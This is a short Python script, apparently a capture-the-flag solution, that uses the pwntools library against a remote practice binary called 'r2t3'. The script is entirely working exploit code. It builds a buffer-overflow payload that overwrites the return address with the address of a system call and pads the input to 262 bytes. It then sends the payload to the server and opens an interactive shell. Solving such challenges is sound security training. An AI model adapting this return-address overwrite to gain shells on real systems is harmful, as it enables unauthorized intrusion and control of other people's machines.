from pwn import *
io=remote('node3.buuoj.cn',25414)
elf=ELF('./r2t3')

system = 0x804858B
binsh = 0x8048760
payload = (cyclic(17+4)+p32(system)).ljust(262,b'a')

io.recv()
io.sendline(payload)
io.interactive()









